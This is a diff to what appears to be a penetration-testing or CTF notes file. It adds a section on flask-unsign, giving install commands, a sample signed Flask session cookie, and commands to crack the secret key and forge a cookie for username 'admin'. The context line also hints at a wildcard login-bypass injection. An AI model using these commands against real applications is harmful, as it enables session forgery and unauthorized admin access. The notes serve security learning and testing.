@@ -10,4 +10,18 @@ the login was successfull entering `*:*` so trying `*:a*` could make us find a c
 
 ---
 
-## [`ToDo`](ToDo)
+## [`flask-unsign`](https://pypi.org/project/flask-unsign/)
+
+Flask Unsign is a penetration testing utility that attempts to uncover a Flask server's secret key by taking a signed session verifying it against a wordlist of commonly used and publicly known secret keys
+it needs to be used against cookie like these (pay attentions to the dots):
+`eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicGV0ZXIifQ.Yv6pSg.hH1pYHVIYni0c0kaxQy2ftP239U`
+
+> install:
+`sudo pip3 install flask-unsign`
+`sudo pip3 install flask-unsign[wordlist]`
+
+> usage unsign:
+`flask-unsign --unsign --cookie 'snap'`
+
+> usage sign:
+`flask-unsign --sign --cookie "{'logged_in': True, 'username' :'admin'}" --secret secret123`
